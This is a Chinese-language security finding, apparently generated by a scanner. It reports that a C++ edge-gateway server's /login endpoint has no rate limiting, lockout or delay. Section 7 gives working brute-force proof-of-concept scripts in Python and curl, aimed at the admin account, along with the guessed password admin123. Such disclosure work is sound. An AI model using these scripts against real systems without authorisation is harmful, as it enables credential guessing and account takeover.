# VULN-SEC-CPP-AUTHN-AUTH-004: 登录接口无暴力破解防护允许无限次密码猜测

**严重性**: High | **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts) | **置信度**: 85/100
**位置**: `src/main.cpp:40-52` @ `main::login_handler`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: authn (认证分析)
**Source/Sink**: network_request → authentication_check
**规则/证据来源**: c_cpp.authn.no_rate_limit / llm

---

## 1. 漏洞细节

POST `/login` 端点完全缺乏暴力破解防护机制。攻击者可以通过网络向该端点发送无限次认证请求，而服务器不会施加任何限制。

具体而言，以下防护措施**全部缺失**：

- **速率限制（Rate Limiting）**: 服务器框架（`HttpServer`）没有中间件层，不存在任何请求频率控制
- **账户锁定（Account Lockout）**: `UserStore::authenticate()` 方法声明为 `const`，无法修改内部状态，因此不可能追踪失败次数
- **渐进延迟（Progressive Delay）**: 登录处理流程中没有任何 `sleep`、定时器或延迟逻辑
- **验证码（CAPTCHA）**: 整个代码库中不存在任何验证码相关实现
- **IP 封禁（IP-based Throttling）**: 服务器不记录客户端 IP，也不基于 IP 做任何限制

此外，该服务监听在 `INADDR_ANY`（0.0.0.0:8080），即绑定所有网络接口，使攻击者可以从任意网络位置发起攻击。结合系统中使用的弱 djb2 哈希算法（仅 32 位输出空间，约 43 亿种可能值），攻击者甚至可以在离线环境中数秒内穷举所有可能的密码哈希值。

### 证据摘要

- **触发源**: network_request — 来自不受信任网络的 HTTP POST 请求
- **危险点**: authentication_check — `UserStore::authenticate()` 无限制地接受认证尝试
- **已检查的清洗/缓解**: 无。全局搜索确认不存在速率限制、账户锁定、渐进延迟、验证码或 IP 封禁机制
- **关键证据**:
  - `authenticate()` 为 `const` 方法（user_store.hpp:16），无法追踪失败次数
  - `AuditLog::event()` 仅被动写文件日志（audit_log.hpp:11-14），无任何执行动作
  - `HttpServer` 无中间件概念（http_server.hpp:21-34），请求直接到达处理器
  - 服务器绑定 `INADDR_ANY`（http_server.cpp:92），对所有网络接口开放

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 40-52)

```cpp
// main.cpp:40-52 — POST /login 路由处理器
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");      // 行 41: 从请求提取用户名
    std::string password = queryValue(request, "password");  // 行 42: 从请求提取密码
    audit.event(username, "login-attempt", request.body);    // 行 43: 仅被动记录日志

    if (!users.authenticate(username, password)) {           // 行 45: 直接认证，无任何前置检查
      return text(401, "invalid credentials\n");             // 行 46: 统一 401 响应
    }

    std::string token = users.issueSession(username);        // 行 49: 认证成功则发放会话
    audit.event(username, "login-success", token);           // 行 50: 记录成功
    return text(200, "session=" + token + "\n");             // 行 51: 返回会话令牌
});
```

**文件**: `src/user_store.cpp` (行 20-26) — 认证函数

```cpp
// user_store.cpp:20-26 — authenticate() 为 const 方法，无法追踪失败次数
bool UserStore::authenticate(const std::string& username,
                             const std::string& password) const {  // const: 不可修改状态
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;   // 用户不存在
  }
  return user->second.passwordHash == weakHash(password);  // 简单哈希比对，无失败计数
}
```

**文件**: `src/http_server.cpp` (行 90-93, 105-133) — 网络绑定与请求处理

```cpp
// http_server.cpp:90-93 — 绑定所有网络接口
address.sin_addr.s_addr = INADDR_ANY;  // 0.0.0.0 — 对所有网络接口开放
address.sin_port = htons(static_cast<uint16_t>(port_));  // 默认端口 8080

// http_server.cpp:105-133 — 无中间件的主循环
for (;;) {
    int client = accept(fd, nullptr, nullptr);  // 接受连接，不检查来源 IP
    // ... 接收数据 ...
    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));
    // ... 直接调用处理器，无任何前置过滤 ...
    response = handler->second(request);  // 行 127: 直接调用，无速率检查
    // ... 发送响应并关闭连接 ...
    close(client);  // 行 132: 关闭后攻击者可立即重连
}
```

**代码分析**: 整个认证流程从网络接收到密码验证是一条直通路径，中间没有任何安全检查点。`authenticate()` 的 `const` 限定符从设计上排除了在该方法内部实现失败计数的可能性。`AuditLog` 仅执行文件写入操作，不具备任何阻断或告警能力。

## 3. 完整攻击链路

```
[入口点] POST /login @ src/main.cpp:40 (网络可达, 无需认证)
↓ HTTP POST 请求携带 user 和 password 参数
[网络接收] accept() + recv() @ src/http_server.cpp:106,113 (无 IP 检查)
↓ 原始请求数据传入 parseRequest()
[请求解析] parseRequest() @ src/http_server.cpp:119 (无速率检查)
↓ 解析后的 HttpRequest 对象传入路由处理器
[路由分发] handlers_.find() @ src/http_server.cpp:120 (无中间件层)
↓ 直接调用 login_handler
[参数提取] queryValue() @ src/main.cpp:41-42 (无输入限制)
↓ username 和 password 字符串传入认证函数
[日志记录] audit.event() @ src/main.cpp:43 (仅被动记录,无执行动作)
↓ 无阻断,继续执行
[认证检查] users.authenticate() @ src/main.cpp:45 (无失败计数,无锁定)
↓ 认证失败时返回 401, 攻击者可立即重试
[连接关闭] close(client) @ src/http_server.cpp:132 (无冷却期)
↓ 攻击者立即建立新连接，循环回到入口点
```

**链路说明**: 攻击链是一个无限制的循环。每次请求从 `accept()` 到 `close()` 的处理时间极短（纯内存哈希比对），攻击者可以高频率发送请求。服务器为单线程模型，虽然同一时刻只处理一个请求，但连接关闭后攻击者可立即重连，实际请求速率仅受网络延迟和服务器处理速度限制。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者。攻击者无需任何先决条件——不需要有效账户、不需要特殊权限、不需要位于特定网络中。任何能够访问目标服务器 8080 端口的网络实体均可发起攻击。

**攻击向量**: 通过 TCP 网络向目标主机的 8080 端口发送 HTTP POST 请求。攻击可自动化工具（如 curl、Python 脚本、Hydra 等）批量执行。

**利用难度**: **低**

### 攻击步骤

1. **侦察**: 确认目标服务器的 IP 地址和端口（默认 8080）可达
2. **用户名枚举**: 利用已知的硬编码用户名（alice、operator、admin）或通过其他途径获取有效用户名
3. **构造暴力破解脚本**: 编写自动化脚本，循环发送 POST `/login?user=<用户名>&password=<密码>` 请求
4. **执行攻击**: 以高频率发送请求，每次尝试不同密码
5. **检测成功**: 监控响应状态码——200 表示认证成功，401 表示失败
6. **利用会话**: 获取成功的 session token 后，可用于后续认证操作

**离线攻击变体**: 如果攻击者能获取到密码哈希值（例如通过其他漏洞读取内存或配置），由于 djb2 哈希仅有 32 位输出空间（约 43 亿种可能），可在数秒内穷举所有哈希值并反推原始密码。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | 需要           | 攻击者需能访问目标服务器的 8080 端口。服务器绑定 INADDR_ANY，对所有网络接口开放            |
| 认证要求   | 无需认证       | 攻击者无需任何有效凭据即可发起攻击，登录端点本身就是攻击目标                               |
| 配置依赖   | 无特殊要求     | 服务器使用默认配置即可被攻击，无需特定功能开关或运行模式                                   |
| 环境依赖   | 无特殊要求     | 任何操作系统上的标准编译均可复现。无 ASLR 或 Stack Canary 相关依赖（此为逻辑漏洞）         |
| 时序条件   | 无             | 不存在竞态条件。攻击者可以任意速率持续发送请求                                             |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                   |
| -------- | ---- | ------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 成功暴力破解后可获取任意用户（包括 admin）的会话令牌，访问该用户有权访问的所有数据和功能               |
| 完整性   | 高   | 获取 admin 账户后可执行管理操作（如 `/admin/export`），篡改系统数据和配置                              |
| 可用性   | 中   | 单线程服务器在高频请求下可能导致合法用户的服务响应延迟；大量审计日志写入可能耗尽磁盘空间               |

**影响范围**: 全局影响。成功暴力破解管理员（admin）账户后，攻击者获得系统最高权限，可访问所有功能端点，包括文件读取（`/files`）、管理导出（`/admin/export`）和调试接口（`/debug/ping`）。此外，由于系统使用弱 djb2 哈希（VULN-SEC-CPP-CRYPTO-AUTH-002），所有用户密码均可被快速破解，影响所有用户账户。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### 在线暴力破解 PoC

```python
#!/usr/bin/env python3
"""
PoC: POST /login 暴力破解攻击
仅供安全测试使用 - 验证登录端点缺乏暴力破解防护
"""
import socket
import sys
import time

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
USERNAME = sys.argv[3] if len(sys.argv) > 3 else "admin"

# 常见密码字典（实际攻击中可使用更大的字典）
PASSWORDS = [
    "admin", "admin123", "password", "123456", "root",
    "operator", "test", "guest", "default", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty"
]

def send_login_request(host, port, username, password):
    """发送单个登录请求并返回响应状态码"""
    request = (
        f"POST /login?user={username}&password={password} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(request.encode())
        response = sock.recv(4096).decode()
        sock.close()
        return response
    except Exception as e:
        return f"ERROR: {e}"

print(f"[*] 目标: {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] 用户名: {USERNAME}")
print(f"[*] 密码字典大小: {len(PASSWORDS)}")
print(f"[*] 开始暴力破解...\n")

start_time = time.time()
attempts = 0

for password in PASSWORDS:
    attempts += 1
    response = send_login_request(TARGET_HOST, TARGET_PORT, USERNAME, password)

    if "200" in response.split("\r\n")[0]:
        elapsed = time.time() - start_time
        print(f"[+] 成功! 密码: {password}")
        print(f"[+] 尝试次数: {attempts}")
        print(f"[+] 耗时: {elapsed:.3f} 秒")
        print(f"[+] 响应: {response}")
        sys.exit(0)
    else:
        print(f"[-] 尝试 {attempts}: {password} -> 失败")

elapsed = time.time() - start_time
print(f"\n[-] 字典耗尽，未找到密码")
print(f"[-] 总尝试次数: {attempts}, 耗时: {elapsed:.3f} 秒")
print(f"[*] 注意: 服务器未实施任何速率限制或账户锁定")
```

### 快速验证脚本（curl）

```bash
#!/bin/bash
# PoC: 快速验证登录端点无速率限制
# 仅供安全测试使用

TARGET="http://127.0.0.1:8080"

echo "[*] 连续发送 100 次错误登录请求..."
for i in $(seq 1 100); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${TARGET}/login?user=admin&password=wrong${i}")
    if [ "$STATUS" != "401" ]; then
        echo "[!] 异常响应码: $STATUS (第 $i 次请求)"
    fi
done
echo "[*] 100 次请求全部返回 401 — 服务器未实施任何限制"

echo ""
echo "[*] 尝试正确密码..."
RESPONSE=$(curl -s -X POST "${TARGET}/login?user=admin&password=admin123")
echo "[+] 响应: $RESPONSE"
```

**使用说明**:

1. 启动目标服务器：`./edge-gateway` （默认监听 8080 端口）
2. 运行 Python PoC：`python3 poc_brute_force.py 127.0.0.1 8080 admin`
3. 或运行 bash 快速验证：`bash poc_curl_verify.sh`

**预期结果**:

- 所有错误密码请求返回 HTTP 401，服务器不施加任何延迟或阻断
- 100 次连续请求全部被正常处理，无速率限制触发
- 正确密码（admin123）请求返回 HTTP 200 和有效会话令牌
- 整个过程中服务器不记录任何告警或实施任何防护措施

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（任何现代发行版，如 Ubuntu 20.04+）
- **编译器**: GCC 9+ 或 Clang 10+（支持 C++17）
- **依赖**: 无外部依赖，仅使用标准库和 POSIX socket API
- **测试工具**: Python 3.6+（用于 PoC 脚本），curl（用于快速验证）

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 使用 CMake 构建（如果存在 CMakeLists.txt）
mkdir -p build && cd build
cmake .. && make

# 或直接编译
g++ -std=c++17 -O0 -g -I include -o edge-gateway \
    src/main.cpp src/http_server.cpp src/user_store.cpp \
    src/file_cache.cpp src/diagnostics.cpp
```

### 运行配置

```bash
# 启动服务器（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需特殊配置文件或环境变量。服务器启动后立即监听所有网络接口。

### 验证步骤

1. 启动服务器并确认监听：`ss -tlnp | grep 8080`
2. 发送单次登录请求验证服务正常：`curl -X POST "http://127.0.0.1:8080/login?user=admin&password=wrong"`
3. 运行快速验证脚本发送 100 次请求，观察是否全部被接受
4. 运行 Python PoC 脚本，验证可成功暴力破解 admin 密码
5. 检查审计日志 `edge-gateway.audit.log` 确认所有尝试被记录但未被阻断

### 预期结果

- 服务器接受所有登录请求，无论频率和数量
- 错误密码始终返回 401，无延迟、无锁定、无 IP 封禁
- 正确密码（admin123）在少量尝试后即可被发现
- 审计日志记录了所有尝试，但不产生任何执行动作
- 攻击者成功获取 admin 会话令牌后可访问所有管理功能
